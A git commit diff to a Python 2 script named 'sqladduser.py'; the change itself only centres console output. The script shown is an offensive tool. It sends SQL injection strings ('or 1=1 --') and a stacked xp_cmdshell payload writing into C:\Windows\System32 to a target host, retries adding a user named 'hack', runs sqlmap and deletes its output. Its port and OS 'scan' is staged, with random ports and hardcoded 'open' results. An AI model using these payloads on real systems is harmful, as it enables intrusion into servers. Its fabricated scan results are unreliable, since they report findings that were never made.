5ae8c5407e470cf2316ea043401186a54d166970
niexinming <993025447@qq.com>
2016-08-26 03:58:56 +0800

    set center

--- sqladduser.py
+++ sqladduser.py
@@ -8,77 +8,87 @@ import random
 import os
 from colorama import Fore,Back,Style,init
 global is_attack
+
+def center_print(str):
+    h,w=os.popen('stty size').readline().split(" ")
+    left=(int(w)-len(str))/2
+    space=""
+    for j in xrange(0,left):
+        space=" "+space
+    print space+str
+
+
 def first_output():
 
-    print "             ,        ,"
-    print "            /(        )`"
-    print "            \ \___   / |"
-    print "            /- _  `-/  '"
-    print "           (/\/ \ \   /\\"
-    print "           / /   | `    \\"
-    print "           O O   ) /    |"
-    print "           `-^--'`<     '"
-    print "          (_.)  _  )   /"
-    print "           `.___/`    /"
-    print "             `-----' /"
-    print "<----.     __ / __   \\"
-    print "<----|====O)))==) \) /===="
-    print "<----'    `--' `.__,' \\"
-    print "             |        |"
-    print "              \       /"
-    print "        ______( (_  / \______"
-    print "      ,'  ,-----'   |        \\"
-    print "      `--{__________)        \/"
+    center_print ("             ,        ,        ")
+    center_print ("            /(        )`       ")
+    center_print ("            \ \___   / |       ")
+    center_print ("            /- _  `-/  '       ")
+    center_print ("           (/\/ \ \   /\\      ")
+    center_print ("           / /   | `    \\     ")
+    center_print ("           O O   ) /    |      ")
+    center_print ("           `-^--'`<     '      ")
+    center_print ("          (_.)  _  )   /       ")
+    center_print ("           `.___/`    /        ")
+    center_print ("             `-----' /         ")
+    center_print ("<----.     __ / __   \\        ")
+    center_print ("<----|====O)))==) \) /====     ")
+    center_print ("<----'    `--' `.__,' \\       ")
+    center_print ("             |        |        ")
+    center_print ("              \       /        ")
+    center_print ("        ______( (_  / \______  ")
+    center_print ("      ,'  ,-----'   |        \\")
+    center_print ("      `--{__________)        \/")
 def end_succes():
-    print "                  *** ###  ### ***"
-    print "              *##                  ##*"
-    print "          *##                          ##*"
-    print "       *##                                ##*"
-    print "     *##                                    ##*"
-    print "   *##          **                **          ##*"
-    print "  *##          *@@*              *@@*          ##*"
-    print "  *##          *@@*              *@@*          ##*"
-    print " *##            **                **            ##*"
-    print "*##                                              ##*"
-    print "*##                      ___                     ##*"
-    print "*##                     |BY:|                    ##*"
-    print "*##        s            |CCW|           s        ##*"
-    print "*##         s            ---           s         ##*"
-    print " *##         s                        s         ##*"
-    print "  *##         's                    s'         ##*"
-    print "   *##          's                s'          ##*"
-    print "     *##          's            s'          ##*"
-    print "       *##           ~ |~v~v~v|~         ##*"
-    print "          *##          |      |        ##*"
-    print "              *##      |   |  |     ##*"
-    print "                  ***  |   |  | ***"
-    print "                       |   |  |"
-    print "                       |   |  |"
-    print "                       |   |  |"
-    print "                       |      |"
-    print "                       |  /\  |"
-    print "                       |/    \|"
+    center_print ("                  *** ###  ### ***                   ")
+    center_print ("              *##                  ##*               ")
+    center_print ("          *##                          ##*           ")
+    center_print ("       *##                                ##*        ")
+    center_print ("     *##                                    ##*      ")
+    center_print ("   *##          **                **          ##*    ")
+    center_print ("  *##          *@@*              *@@*          ##*   ")
+    center_print ("  *##          *@@*              *@@*          ##*   ")
+    center_print (" *##            **                **            ##*  ")
+    center_print ("*##                                              ##* ")
+    center_print ("*##                      ___                     ##* ")
+    center_print ("*##                     |BY:|                    ##* ")
+    center_print ("*##        s            |CCW|           s        ##* ")
+    center_print ("*##         s            ---           s         ##* ")
+    center_print (" *##         s                        s         ##*  ")
+    center_print ("  *##         's                    s'         ##*   ")
+    center_print ("   *##          's                s'          ##*    ")
+    center_print ("     *##          's            s'          ##*      ")
+    center_print ("       *##           ~ |~v~v~v|           ##*        ")
+    center_print ("          *##          |      |        ##*           ")
+    center_print ("              *##      |   |  |     ##*              ")
+    center_print ("                  ***  |   |  | ***                  ")
+    center_print ("                       |   |  |                      ")
+    center_print ("                       |   |  |                      ")
+    center_print ("                       |   |  |                      ")
+    center_print ("                       |      |                      ")
+    center_print ("                       |  /\  |                      ")
+    center_print ("                       |/    \|                      ")
 
 def end_fail():
-    print "                       __---__"
-    print "                    _-       /--______"
-    print "               __--( /     \ )XXXXXXXXXXX\v."
-    print "             .-XXX(   O   O  )XXXXXXXXXXXXXXX-"
-    print "            /XXX(       U     )        XXXXXXX\\"
-    print "         /XXXXX(              )--_  XXXXXXXXXXX\\"
-    print "         /XXXXX/ (      O     )   XXXXXX   \XXXXX\\"
-    print "         XXXXX/   /            XXXXXX   \__ \XXXXX"
-    print "         XXXXXX__/          XXXXXX         \__---->"
-    print " ---___  XXX__/          XXXXXX      \__         /"
-    print "   \-  --__/   ___/\  XXXXXX            /  ___--/="
-    print "    \-\    ___/    XXXXXX              '--- XXXXXX"
-    print "       \-\/XXX\ XXXXXX                      /XXXXX"
-    print "         \XXXXXXXXX   \                    /XXXXX/"
-    print "          \XXXXXX      >                 _/XXXXX/"
-    print "            \XXXXX--__/              __-- XXXX/"
-    print "             -XXXXXXXX---------------  XXXXXX-"
-    print "               \XXXXXXXXXXXXXXXXXXXXXXXXXX/"
-    print "                  ""VXXXXXXXXXXXXXXXXXXV"""
+    center_print ("                       __---__                     ")
+    center_print ("                    _-       /--______             ")
+    center_print ("               __--( /     \ )XXXXXXXXXXX\v.       ")
+    center_print ("             .-XXX(   O   O  )XXXXXXXXXXXXXXX-     ")
+    center_print ("            /XXX(       U     )        XXXXXXX\\   ")
+    center_print ("         /XXXXX(              )--_  XXXXXXXXXXX\\  ")
+    center_print ("         /XXXXX/ (      O     )   XXXXXX   \XXXXX\\")
+    center_print ("         XXXXX/   /            XXXXXX   \__ \XXXXX ")
+    center_print ("         XXXXXX__/          XXXXXX         \__---->")
+    center_print (" ---___  XXX__/          XXXXXX      \__         / ")
+    center_print ("   \-  --__/   ___/\  XXXXXX            /  ___--/= ")
+    center_print ("    \-\    ___/    XXXXXX              '--- XXXXXX ")
+    center_print ("       \-\/XXX\ XXXXXX                      /XXXXX ")
+    center_print ("         \XXXXXXXXX   \                    /XXXXX/ ")
+    center_print ("          \XXXXXX      >                 _/XXXXX/  ")
+    center_print ("            \XXXXX--__/              __-- XXXX/    ")
+    center_print ("             -XXXXXXXX---------------  XXXXXX-     ")
+    center_print ("               \XXXXXXXXXXXXXXXXXXXXXXXXXX/        ")
+    center_print ("                  ""VXXXXXXXXXXXXXXXXXXV""         ")
 
 
 def crawl(host):
@@ -89,15 +99,15 @@ def crawl(host):
         #print htmlSource
         linksList = re.findall('<a href=(.*?)>.*?</a>', htmlSource)
         for link in linksList:
-            print "http://"+host+link[1:-1]+"?id=or 1=1 --"
+            center_print ("http://"+host+link[1:-1]+"?id=or 1=1 --")
             time.sleep(0.5)
-        print "test.ashx?id=or 1=1"
+        center_print ("test.ashx?id=or 1=1")
     except:
         print '\033[1;31;40m'
-        print "目标连接失败，尝试用暴力方式进行攻击"
+        center_print ("目标连接失败，尝试用暴力方式进行攻击")
         print '\033[0m'
 def del_file(host):
-    print "开始尝试替换用户桌面"
+    center_print ("开始尝试替换用户桌面")
     time.sleep(3)
     try:
         del_data="1; exec ..xp_cmdshell 'echo 1 > c:\Windows\System32\lala.txt'"
@@ -106,12 +116,12 @@ def del_file(host):
         html=urllib2.urlopen(full_url)
         print html.read()
         time.sleep(3)
-        print "" + Fore.GREEN + Style.BRIGHT+"替换用户桌面成功"
+        center_print ("" + Fore.GREEN + Style.BRIGHT+"替换用户桌面成功")
     except:
-        print "" + Fore.RED + Style.BRIGHT+"替换用户桌面失败"
+        center_print ("" + Fore.RED + Style.BRIGHT+"替换用户桌面失败")
 
 def is_safe(host):
-    print "开始检测目标ip："+host;
+    center_print ("开始检测目标ip："+host)
     for i in range(0,3):
         sys.stdout.write(".")
         sys.stdout.flush()
@@ -119,44 +129,47 @@ def is_safe(host):
     print ""
 def scan_port_os(host):
     ay=[]
-    for randomi in xrange(0,200):
+    open_port=[445,139,1433,3389,80]
+    for randomi in xrange(0,100):
         ay.append(random.randint(10,10000))
     ay.append(80)
     ay.append(1433)
     ay.append(3389)
+    ay.append(139)
+    ay.append(445)
     ay.sort()
     news_ay = []
     for id in ay:
         if id not in news_ay:
             news_ay.append(id)
     for i in news_ay:
-        if(i==80 or i==3389 or i==1433):
+        if(i in open_port):
             print '\033[1;31;42m'
-            print "检测到" + str(i) + "开放"
+            center_print ("检测到" + str(i) + "开放")
             print '\033[0m'
             time.sleep(1)
-        print "检测端口"+str(i)+"是否开放"
+        center_print ("检测端口"+str(i)+"是否开放")
         time.sleep(0.1)
-    print "" + Fore.GREEN + Style.BRIGHT +"port        status        service"
-    print "" + Fore.BLUE+   Style.BRIGHT +"80            open        http"
-    print "" + Fore.BLUE + Style.BRIGHT + "139           open        microsoft-ds"
-    print "" + Fore.BLUE + Style.BRIGHT + "445           open        microsoft-ds"
-    print "" + Fore.BLUE + Style.BRIGHT + "1433          open        mssql"
-    print "" + Fore.BLUE + Style.BRIGHT + "3389          open        rdp"
-    print ""+Fore.RESET+Style.RESET_ALL
-    print "检测操作系统："
-    print "是否为unix"
+    center_print ("" + Fore.GREEN + Style.BRIGHT +"port        status        service     ")
+    center_print ("" + Fore.BLUE+   Style.BRIGHT +"80            open        http        ")
+    center_print ("" + Fore.BLUE + Style.BRIGHT + "139           open        microsoft-ds")
+    center_print ("" + Fore.BLUE + Style.BRIGHT + "445           open        microsoft-ds")
+    center_print ("" + Fore.BLUE + Style.BRIGHT + "1433          open        mssql       ")
+    center_print ("" + Fore.BLUE + Style.BRIGHT + "3389          open        rdp         ")
+    center_print (""+Fore.RESET+Style.RESET_ALL)
+    center_print ("检测操作系统：")
+    center_print ("是否为unix   ")
     time.sleep(2)
-    print "是否为linux"
+    center_print ("是否为linux  ")
     time.sleep(2)
-    print "是否为windows"
+    center_print ("是否为windows")
     time.sleep(2)
-    print "检测系统成功，系统为:windows"
-    print "检测漏洞"
+    center_print ("检测系统成功，系统为:windows")
+    center_print ("检测漏洞")
     crawl(host)
-    print "发现有sql注入漏洞，开始攻击"
+    center_print ("发现有sql注入漏洞，开始攻击")
     time.sleep(5)
-    cool_show()
+    #cool_show()
 
 def cool_show():
     f = open("/bin/bash", 'rb')
@@ -187,21 +200,21 @@ def attack(ipaddr,i):
     try:
         res=urllib2.urlopen(url_host+urldata)
         print res.read()
-        print "尝试添加用户hack"
+        center_print ("尝试添加用户hack")
         print '\033[1;31;42m'
         time.sleep(1)
-        print "攻击成功"
+        center_print ("攻击成功")
         print '\033[0m'
     except:
         print '\033[1;31;40m'
-        print "攻击失败,尝试重新攻击"
+        center_print ("攻击失败,尝试重新攻击")
         print '\033[0m'
         time.sleep(2)
         attack(ipaddr,i-1)
 
 def res_out():
-    print "" + Fore.RED + Style.BRIGHT+Back.BLACK+"服务器被成功攻陷"
-    print "" + Fore.RED + Style.BRIGHT + Back.BLACK + "服务器被成功攻陷"
+    center_print ("" + Fore.RED + Style.BRIGHT+Back.BLACK+"服务器被成功攻陷")
+    center_print ("" + Fore.RED + Style.BRIGHT + Back.BLACK + "服务器被成功攻陷")
 if __name__ == '__main__':
     #ipaddr=sys.argv[1]
     global is_attack
@@ -217,6 +230,7 @@ if __name__ == '__main__':
         os.system('sh ~/sqlmap')
         os.system('rm -rf ~/.sqlmap/output')
         res_out()
+        print ""+Fore.WHITE+Style.BRIGHT+Back.BLACK+""
         end_succes()
     else:
         end_fail()
